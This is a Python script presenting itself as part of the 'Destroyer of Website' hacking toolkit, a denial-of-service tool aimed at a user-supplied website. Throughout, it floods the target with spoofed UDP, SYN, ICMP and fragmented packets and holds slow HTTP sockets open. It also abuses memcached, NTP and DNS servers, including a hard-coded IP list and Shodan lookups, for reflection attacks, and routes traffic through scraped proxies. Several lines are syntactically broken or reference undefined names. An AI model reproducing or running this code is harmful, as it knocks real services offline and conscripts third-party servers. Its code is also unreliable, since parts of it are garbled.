
# This is part from DoW (Destroyer of Website)Toolkit

DEBUG = False # True or False

#APIPROXY,PROXY_ADDR,PROXY_PORT = (False,'127.0.0.1',9050) # Tor proxy

import os,sys

oscheck1 = os.system('cls') # Check Platform
if oscheck1==0:
    cpt = True
else:
    cpt =  False
    _=os.system('clear')

# Import Packages
import random,threading,time,requests,time,urllib.request,argparse,shodan,string,base64,socks
from scapy.all import *
from threading import Thread
from colorama import Fore

# Import Arguments
arg = argparse.ArgumentParser()
arg.add_argument("-B","--brute",help='Launches progressively bigger attacks',action='store_true',dest='brute',default=False,required=False)
arg.add_argument("-q","--quiet",help='Hide the banner',action='store_true',dest='quiet',default=False,required=False)
arg.add_argument("-s","--slow",help='Slow DDoS Attack',action='store_true',dest='slow',default=False,required=False)
arg.add_argument("-c","--charge",help='Collecting thread during given time',action='store_true',dest='charge',default=False,required=False)
arg.add_argument("-shd","--shodan",help='Get bot from shodan',action='store_true',dest='shodan',default=False,required=False)
arg = arg.parse_args()

# Preparing
rcounter,fcounter,counter = (0,0,0)
pxfail,tl,memchbots = ([],[],[])

# Check
try:
    APIPROXY
except NameError:
    APIPROXY = True
if arg.brute:
    if arg.charge:
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Cant use brute with charge arg')
        else:
            sys.exit('[ERR] Cant use brute with charge arg')
if arg.slow:
    if arg.shodan:
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Cant use slow with other arg')
        else:
            sys.exit('[ERR] Cant use slow with other arg')
    if arg.brute:
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Cant use slow with other arg')
        else:
            sys.exit('[ERR] Cant use slow with other arg')
    if arg.charge:
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Cant use slow with other arg')
        else:
            sys.exit('[ERR] Cant use slow with other arg')
    if arg.bot:
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Cant use slow with other arg')
        else:
            sys.exit('[ERR] Cant use slow with other arg')

def SPDA(port,t,url,packet,rurl):
    while True:
        prx = RandPX()
        s = socks.socksoket()
        if not APIPROXY:
            s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
        elif APIPROXY:
            s.set_proxy(prx['http'],'http')
            s.set_proxy(prx['https'],'https')
        s.connect((t,port))
        if str(port) == '443':
            sl = ssl.SSLContext()
            s = sl.wrap_socket(s,server_hostname=url)
        tl.append(s)
        if not cpt:
            print('['+Fore.GREEN+'INF'+Fore.RESET+'] A socket created')
        else:
            print('[INF] A socket created')
        while True:
            try:
                s.send(b'GET /?'+str(random.randint(3000,5000)).encode()+b' HTTP/1.1\r\nHost: '+rurl.encode()+b'\r\nUser-Agent: '+UARand().encode()+b'\n\rCache-Control: no-cache\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: '+str(random.randint(110,120)).encode()+b'Connection: keep-alive\r\nReferer: '+BOTRand().encode()+b'Hi%2C%20How%20is%20your%20day\r\n')
            except socket.error:
                s.close()
                if not cpt:
                    print('['+Fore.RED+'ERR'+Fore.RESET+'] A socket failed')
                else:
                    print('[ERR] A socket failed')
                tl.remove(s)
                break

def SThread(at=None):
    if at == b:
        while True:
            MATK(prt,t,url,packsz,raw_url).start()
    elif at == c:
        global tl
        timer = int(time.perf_counter())
        end_timer = timer+int(preptime)
        while end_timer>int(time.perf_counter()):
            worker = MATK(prt,t,url,packsz,raw_url)
            tl.append(worker)
            if not cpt:
                print('['+Fore.GREEN+'INF'+Fore.RESET+'] Thread Ready : '+str(len(tl))+' | Time Remain '+str(end_timer-int(time.perf_counter()))+'s') # Charge Attack
            else:
                print('[INF] Thread Ready : '+str(len(tl))+' | Time Remain '+str(end_timer-int(time.perf_counter()))+'s')
        if not cpt:+Fore.RESET+'] Starting '+str(len(tl))+' thread...'
        else:
            print('[PRG] Starting '+str(print('['+Fore.YELLOW+'PRG'+len(tl))+'thread...')
        
        for t in tl:
            t.start()                  
    elif at == s:
        for _ in range(thread):
            threading.Thread(target=SPDA,args=[prt,t,url,packsz,raw_url]).start()
    else:
        for _ in range(thread):
            MATK(prt,t,url,packsz,raw_url).start()

class MATK(threading.Thread):
    def __init__(self,port,t,url,packet,rurl):
        self.tport = port
        self.sport = RandShort()
        self.ua = UARand()
        self.bot = BOTRand()
        self.tip = t
        self.qht = url
        self.sip = IPRand()
        self.dns = DNSRand()
        self.memch = Randmembots()
        self.gup = GUP()
        self.npurl = rurl
        self.ntp = NTPRand()
        self.packet = packet
        self.prx = RandPX()
        threading.Thread.__init__(self)

    def run(self):
        while True:
            global rcounter,fcounter
            f = False
            if cpt:
                _=os.system('title [INF] Close the terminal to stop')
            try:
                self.req = urllib.request.Request(self.qht)
                urlb = True
            except:
                urlb = False
                f = True
            try:
                if urlb:
                    if not APIPROXY:
                        self.req.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        self.req.set_proxy(self.prx['http'],'http')
                        self.req.set_proxy(self.prx['https'],'https')
            except:
                f = True
            try:
                send(IP(src=self.sip,dst=self.tip)/UDP(sport=self.sport,dport=self.tport)/Raw(load=RandPLD()),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip)/UDP(sport=self.sport,dport=self.tport)/Raw(load=RandPLD())))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('User-Agent', self.ua)
            except:
                pass
            try:
                send(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport)/Raw(load=RandPLD()),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport)/Raw(load=RandPLD())))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('Cache-Control', 'no-cache')
            except:
                pass
            try:
                send(IP(src=self.sip,dst=self.tip)/UDP(sport=self.sport,dport=self.tport)/Raw(load="GET "+self.qht+" HTTP/1.1\r\n"),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip)/UDP(sport=self.sport,dport=self.tport)/Raw(load="GET "+self.qht+" HTTP/1.1\r\n")))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
            except:
                pass
            try:
                send(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport)/Raw(load="GET /%s HTTP/1.1\nHost: %s\n\n" % (GUP(), t)),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport)/Raw(load="GET /%s HTTP/1.1\nHost: %s\n\n" % (GUP(), t))))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('Referer', bot+'Hi%2C%20How%20is%20your%20day')
            except:
                pass
            try:
                send(IP(src=self.sip,dst=self.tip,ihl=2,version=3)/ICMP(),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip,ihl=2,version=3)/ICMP()))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('Keep-Alive', random.randint(110,120))
            except:
                pass
            try:
                send(IP(src=self.tip,dst=self.memch)/UDP(sport=80,dport=11211)/Raw(load='\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'),count=100,verbose=DEBUG)
            except:
                f = True
            try:
                if urlb:
                    self.req.add_header('Connection', 'keep-alive')
            except:
                pass
            try:
                send(fragment(IP(src=self.sip,dst=self.tip)/ICMP()/Raw(load=RandPLD())))
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(fragment(IP(src=self.sip,dst=self.tip)/ICMP()/Raw(load=RandPLD()))))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    self.req.add_header('Host',self.tip)
            except:
                pass
            try:
                send(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport,flags='S',seq=RandShort(),window=RandShort()),count=100,verbose=DEBUG)
            except:
                try:
                    s = socks.socksoket()
                    if not APIPROXY:
                        s.set_proxy(PROXY_ADDR+':'+PROXY_PORT,'socks5')
                    elif APIPROXY:
                        s.set_proxy(prx['http'],'http')
                        s.set_proxy(prx['https'],'https')
                    s.connect((self.tip,self.dport))
                    if self.tport == 443:
                        sl = ssl.SSLContext()
                        s = sl.wrap_socket(s,server_hostname=self.qht)
                    while True:
                        try:
                            s.send(bytes(IP(src=self.sip,dst=self.tip)/TCP(sport=self.sport,dport=self.tport,flags='S',seq=RandShort(),window=RandShort())))
                            s.close()
                except:
                    s.close()
                    f = True
            try:
                if urlb:
                    urllib.request.urlopen(self.req)
            except:
                pass
            try:
                send(IP(src=self.tip,dst=self.ntp)/UDP(sport=51147,dport=123)/Raw(load='\x17\x00\x03*\x00\x00\x00\x00'),count=100,verbose=DEBUG)
            except:
                f = True
            try:
                send(IP(src=self.tip,dst=self.dns)/UDP(sport=self.sport,dport=53)/DNS(rd=1,qd=DNSQR(qname=self.npurl,qtype=255)),count=50,verbose=DEBUG)
            except:
                f = True
            if not f:
                rcounter = rcounter+1
                if not cpt:
                    print('['+Fore.GREEN+'INF'+Fore.RESET+'] Success : '+str(rcounter)+' | Unfinished : '+str(fcounter))
                else:
                    print('[INF] Success : '+str(rcounter)+' | Unfinished : '+str(fcounter))
            else:
                fcounter = fcounter+1
                if not cpt:
                    print('['+Fore.GREEN+'INF'+Fore.RESET+'] Success : '+str(rcounter)+' | Unfinished : '+str(fcounter))
                else:
                    print('[INF] Success : '+str(rcounter)+' | Unfinished : '+str(fcounter))

def banner():
    if not cpt:
        print("                                                        \n`8.`888b                 ,8' 8888888 8888888888 8 888888888o.      \n `8.`888b               ,8'        8 8888       8 8888    `^888.   \n  `8.`888b             ,8'         8 8888       8 8888        `88. \n   `8.`888b     .b    ,8'          8 8888       8 8888         `88 \n    `8.`888b    88b  ,8'           8 8888       8 8888          88 \n     `8.`888b .`888b,8'            8 8888       8 8888          88 \n      `8.`888b8.`8888'             8 8888       8 8888         ,88 \n       `8.`888`8.`88'              8 8888       8 8888        ,88' \n        `8.`8' `8,`'               8 8888       8 8888    ,o88P'   \n         `8.`   `8'                8 8888       8 888888888P'      \n"+Fore.RED+"==================================================================\n"+Fore.YELLOW+"            Part from Destroyer of Website Hacking Toolkit\n                          Web to Die Tool\n"+Fore.RED+"==================================================================\n"+Fore.RESET+"")
    else:
        print("                                                        \n`8.`888b                 ,8' 8888888 8888888888 8 888888888o.      \n `8.`888b               ,8'        8 8888       8 8888    `^888.   \n  `8.`888b             ,8'         8 8888       8 8888        `88. \n   `8.`888b     .b    ,8'          8 8888       8 8888         `88 \n    `8.`888b    88b  ,8'           8 8888       8 8888          88 \n     `8.`888b .`888b,8'            8 8888       8 8888          88 \n      `8.`888b8.`8888'             8 8888       8 8888         ,88 \n       `8.`888`8.`88'              8 8888       8 8888        ,88' \n        `8.`8' `8,`'               8 8888       8 8888    ,o88P'   \n         `8.`   `8'                8 8888       8 888888888P'      \n==================================================================\n            Part from Destroyer of Website Hacking Toolkit\n                          Web to Die Tool\n==================================================================\n")

def Randmembots():
    a = random.randint(0,len(memchbots) - 1)
    b = memchbots[a]
    return b

def BOTRand():
    a = ['https://www.google.com/?q=', 'https://www.usatoday.com/search/?q=', 'https://yandex.com/search/?text=', 'https://search.yahoo.com/search?p=', 'https://www.youtube.com/results?search_query=', 'https://github.com/search?q=', 'https://www.facebook.com/search/top?q=', 'https://web.roblox.com/games/?Keyword=', 'https://open.spotify.com/search/', 'https://duckduckgo.com/?q=', 'https://www.shodan.io/search?query=', 'https://discord.com/guild-discovery?query=', 'https://www.bing.com/search?q=bruh', 'https://translate.google.co.id/?sl=auto&tl=en&text=', 'https://search.creativecommons.org/search?q=', 'https://swisscows.com/web?query=', 'https://minecraft.fandom.com/wiki/Special:Search?search=', 'https://stackoverflow.com/search?q=', 'https://www.joox.com/id/search/', 'https://www.google.com/maps/search/']
    return a[random.randrange(len(a))]

def GUP():
    a = str(string.ascii_letters + string.digits + string.punctuation)
    return "".join(random.sample(a, 5))

def RandPLD():
    base = ''
    a = ['Q','w','1','E','r','2','T','y','3','U','i','4','O','p','5','A','s','6','D','f','7','G','h','8','J','k','9','L','z','0','X','c','V','b','N','m','q','W','e','R','t','Y','u','I','o','P','a','S','d','F','g','H','j','K','l','Z','x','C','v','B','n','M']
    for i in range(random.randint(60000,65000)):
        base += a[random.randrange(len(a))]
    return base

def RandPX():
    global pxfail
    while True:
        try:
            while True:
                rhttp = requests.get('https://api.proxyscrape.com/?request=displayproxies&ssl=no&proxytype=http&country=all')
                htp = rhttp.text.splitlines()
                px1 = htp[random.randrange(htp)]
                if not px1 in pxfail:
                    break
            _=requests.get('https://www.google.com/',proxies={'http': px1})
        except:
            pxfail.append(px1)
            pass
        else:
            break
    while True:
        try:
            while True:
                rhttps = requests.get('https://api.proxyscrape.com/?request=displayproxies&ssl=yes&proxytype=http&country=all')
                htps = rhttps.text.splitlines()
                px2 = htps[random.randrange(htps)]
                if not px2 in pxfail:
                    break
            _=requests.get('https://www.google.com/',proxies={'https': px2})
        except:
            pxfail.append(px2)
            pass
        else:
            break
    return {'http': px1, 'https': px2}

def UARand():
    base = 'Mozilla /5.0 ('
    plt = ['Linux; ','Windows NT ','Macintosh; Intel Mac OS X ','X11; '][random.randint(0,3)]
    base += plt
    if plt=='Linux; ':
        osp = ['U; ','Android '][random.randint(0,1)]
        if osp=='Android ':
            osp += ['4.','5.'][random.randint(0,1)]+['0.','2.','4.'][random.randint(0,2)]+str(random.randint(1,4))
        elif osp=='U; ':
            osp += 'Android '+['4.','5.'][random.randint(0,1)]+['0.','2.','4.'][random.randint(0,2)]+str(random.randint(1,4))
        base+=osp+')'
    elif plt=='Windows NT ':
        osp = str(random.randint(5,10))+'.'
        if not osp=='10':
            str(random.randint(1,3))
        
        if random.randint(1,2)==2:
            osp += '; WOW64'
            if random.randint(1,2)==2:
                osp += '; Trident/7.0; rv:11.0'
        else:
            osp += '; Win64; x64'
        base += osp+')'
    elif plt=='Macintosh; Intel Mac OS X ':
        base += '10_'+str(random.randint(6,10))+'_'+str(random.randint(2,5))+')'
    elif plt=='X11; ':
        osp = ['CrOS x86_64 ','Ubuntu; ','U; ','Linux i686','Linux x86_64'][random.randint(0,4)]+')'
        if osp=='CrOS x86_64 ':
            osp += str(random.randint(6500,7077))+'.'+str(random.randint(52,134))+'.0)'
            base += osp
        elif osp=='Ubuntu; ':
            osp += ['Linux i686','Linux x86_64'][random.randint(0,1)]
            if random.randint(1,2)==2:
                osp += '; rv:'+str(random.randint(33,40))+'.0'
        elif osp=='U; ':
            osp += ['Linux i686','Linux x86_64'][random.randint(0,1)]+', en-US'
        base += osp
    ie = [' Gecko/20100101',' AppleWebKit/537.36 (KHTML, like Gecko)'][random.randint(0,1)]
    if ie==' AppleWebKit/537.36 (KHTML, like Gecko)':
        ie += ' Chrome/'+str(random.randint(31,91))+'.0.'+str(random.randint(1650,4472))+'.'+str(random.randint(0,95))+' Safari/537.36'
    elif ie==' Gecko/20100101':
        ie += ' Firefox/'+str(random.randint(29,40))
    base += ie
    return base

def DNSRand():
    a = ['8.8.8.8','1.1.1.1','9.9.9.9','198.101.242.72','185.228.168.168']
    return a[random.randrange(len(a))]

def NTPRand():
    a = ['time.google.com', 'time.facebook.com', 'time.windows.com', 'pool.ntp.org', '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org', 'europe.pool.ntp.org', '0.europe.pool.ntp.org', '1.europe.pool.ntp.org', '2.europe.pool.ntp.org', '3.europe.pool.ntp.org', 'asia.pool.ntp.org', '0.asia.pool.ntp.org', '1.asia.pool.ntp.org', '2.asia.pool.ntp.org', '3.asia.pool.ntp.org', 'ru.pool.ntp.org', '0.ru.pool.ntp.org', '1.ru.pool.ntp.org', '2.ru.pool.ntp.org', '3.ru.pool.ntp.org', '0.gentoo.pool.ntp.org', '1.gentoo.pool.ntp.org', '2.gentoo.pool.ntp.org', '3.gentoo.pool.ntp.org', '0.arch.pool.ntp.org', '1.arch.pool.ntp.org', '2.arch.pool.ntp.org', '3.arch.pool.ntp.org', '0.fedora.pool.ntp.org', '1.fedora.pool.ntp.org', '2.fedora.pool.ntp.org', '3.fedora.pool.ntp.org', '0.opensuse.pool.ntp.org', '1.opensuse.pool.ntp.org', '2.opensuse.pool.ntp.org', '3.opensuse.pool.ntp.org', '0.centos.pool.ntp.org', '1.centos.pool.ntp.org', '2.centos.pool.ntp.org', '3.centos.pool.ntp.org', '0.debian.pool.ntp.org', '1.debian.pool.ntp.org', '2.debian.pool.ntp.org', '3.debian.pool.ntp.org', '0.askozia.pool.ntp.org', '1.askozia.pool.ntp.org', '2.askozia.pool.ntp.org', '3.askozia.pool.ntp.org', '0.freebsd.pool.ntp.org', '1.freebsd.pool.ntp.org', '2.freebsd.pool.ntp.org', '3.freebsd.pool.ntp.org', '0.netbsd.pool.ntp.org', '1.netbsd.pool.ntp.org', '2.netbsd.pool.ntp.org', '3.netbsd.pool.ntp.org', '0.openbsd.pool.ntp.org', '1.openbsd.pool.ntp.org', '2.openbsd.pool.ntp.org', '3.openbsd.pool.ntp.org', '0.dragonfly.pool.ntp.org', '1.dragonfly.pool.ntp.org', '2.dragonfly.pool.ntp.org', '3.dragonfly.pool.ntp.org', '0.pfsense.pool.ntp.org', '1.pfsense.pool.ntp.org', '2.pfsense.pool.ntp.org', '3.pfsense.pool.ntp.org', '0.opnsense.pool.ntp.org', '1.opnsense.pool.ntp.org', '2.opnsense.pool.ntp.org', '3.opnsense.pool.ntp.org', '0.amazon.pool.ntp.org', '1.amazon.pool.ntp.org', '2.amazon.pool.ntp.org', '3.amazon.pool.ntp.org', '0.id.pool.ntp.org', '1.id.pool.ntp.org', '2.id.pool.ntp.org', '3.id.pool.ntp.org']
    return a[random.randrange(len(a))]

def IPRand():
    while True:
        a = random.randint(0,255)
        if a != 127 or 0:
            break
    b = random.randint(0,255)
    c = random.randint(0,255)
    d = random.randint(0,255)
    return str(a)+'.'+str(b)+'.'+str(c)+'.'+str(d)

if not arg.quiet:
    banner()
if arg.brute:
    if not cpt:
        print('['+Fore.YELLOW+'WRN'+Fore.RESET+'] Brutes mode on (in. attack until target or this program crashed)')
    else:
        print('[WRN] Brutes mode on (in. attack until target or this program crashed)')
while True:
    raw_url=input('Url (eg. www.example.com) : ')
    try:
        t = socket.gethostbyname(raw_url)
    except socket.gaierror:
        if not cpt:
            print('['+Fore.RED+'ERR'+Fore.RESET+'] Cannot find url')
        else:
            print('[ERR] Cannot find url')
    else:
        break

while True:
    try:
        prt=int(input('Port : '))
    except ValueError:
        if not cpt:
            print('['+Fore.RED+'ERR'+Fore.RESET+'] Not valid number')
        else:
            print('[ERR] Not valid number')
    else:
        break
try:
    if prt == 443:
        url = ('https://'+raw_url)
    else:
        url = ('http://'+raw_url)
    r = requests.get(url, headers={'User-Agent': UARand()})
except requests.exceptions.ConnectionError:
    url = raw_url

if not arg.brute:
    if not arg.charge:
        while True:
            try:
                thread=int(input('Threads (in. attacker amount(More = Lag)) : '))
            except ValueError:
                if not cpt:
                    print('['+Fore.RED+'ERR'+Fore.RESET+'] Not valid number')
                else:
                    print('[ERR] Not valid number')
            else:
                break
if arg.shodan:
    try:
        shapi = input('Shodan API Key : ')
        api = shodan.Shodan(shapi)
        sshodan = api.search('product:"memcached" port:11211')
    except:
        sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Authentication Failed')
    if not cpt:
        print('['+Fore.GREEN+'INF'+Fore.RESET+'] Bots : '+sshodan['total'])
        print('['+Fore.YELLOW+'PRG'+Fore.RESET+'] Listing Bots...')
    else:
        print('[INF] Bots : '+sshodan['total'])
        print('[PRH] Listing Bots...')
    for res in sshodan['matches']:
        memchbots.append(res['ip_str'])

elif not arg.shodan:
    memchbots = ['103.81.195.137', '52.192.227.241', '192.99.182.220', '37.140.199.48', '213.207.92.30', '66.63.184.146', '195.201.55.202', '103.107.151.1', '193.49.54.59', '37.48.78.132', '47.241.6.231', '69.10.62.89', '62.60.253.237', '119.47.88.85', '103.75.177.67', '43.240.75.128', '24.233.13.188', '103.92.84.221', '112.137.167.182']

if arg.charge:
    preptime = input('Threads Preparation Time In Sec (in. longer=more thread) :')
    thread = int('0')
if not arg.charge:
    preptime = int('0')
while True:
    try:
        packsz=int(input('Packet size (in. packet size(More = Slow) : '))
    except ValueError:
        if not cpt:
            print('['+Fore.RED+'ERR'+Fore.RESET+'] Not valid number')
        else:
            print('[ERR] Not valid number')
    else:
        break
if arg.brute:
    thread = 'Inf'
if not cpt:
    print('\n['+Fore.GREEN+'INF'+Fore.RESET+'] Target : '+url+'\n['+Fore.GREEN+'INF'+Fore.RESET+'] Port : '+str(prt)+'\n['+Fore.GREEN+'INF'+Fore.RESET+'] Threads : '+str(thread)+'\n['+Fore.GREEN+'INF'+Fore.RESET+'] Packet : '+str(packsz)+'\n['+Fore.GREEN+'INF'+Fore.RESET+'] IPv4 : '+t+'\n\n['+Fore.YELLOW+'RPT'+Fore.RESET+']Attack start in 5 sec...') # Show Info
else:
    print('\n[INF] Target : '+url+'\n[INF] Port : '+str(prt)+'\n[INF] Threads : '+str(thread)+'\n[INF] Packet : '+str(packsz)+'\n[INF] IPv4 : '+t+'\n\n[RPT]Attack start in 5 sec...')
if not arg.brute:
    thread = int(thread)
if arg.charge:
    tr = '.'
else:
    tr = ''
time.sleep(5)
if arg.brute: threading.Thread(target=SThread,args=['b']).start()
elif arg.charge: threading.Thread(target=SThread,args=['c']).start()
elif arg.slow: threading.Thread(target=SThread,args=['c']).start()
else: threading.Thread(target=SThread).start()
while True:
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        sys.exit('[INF] Stopping | Killing '+str(len(tl))+' thread...')
